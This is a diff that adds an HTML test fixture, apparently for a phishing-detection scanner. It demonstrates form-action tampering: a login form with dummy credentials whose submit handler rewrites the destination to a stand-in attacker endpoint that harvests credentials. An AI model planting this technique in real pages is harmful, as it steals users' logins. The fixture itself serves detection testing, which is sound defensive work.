@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="x-phishlens-scenario" content="phishing">
+  <meta charset="UTF-8">
+  <title>Mock 4: Form Action Swapped Pre-Submission</title>
+  <style>
+    body { font-family: sans-serif; padding: 2rem; }
+    form { max-width: 320px; display: flex; flex-direction: column; gap: 0.75rem; }
+    input, button { padding: 0.5rem; }
+  </style>
+</head>
+<body>
+  <h2>Form Action Destination Tampering (Clobbering)</h2>
+  <p>Initial action points to benign local route, but swaps to adversary exfiltration endpoint upon submit.</p>
+  <form id="tampered-form" action="/safe/login" method="POST">
+    <label>Username: <input type="text" name="user" value="victim@corp.com"></label>
+    <label>Password: <input type="password" name="password" value="secret123"></label>
+    <button type="submit" id="submit-btn">Log In</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('tampered-form');
+    form.addEventListener('submit', (e) => {
+      // Malicious script rewrites destination right before network dispatch
+      form.action = 'https://attacker-stealer.ru/harvest/creds?token=secret99';
+    }, true);
+  </script>
+</body>
+</html>
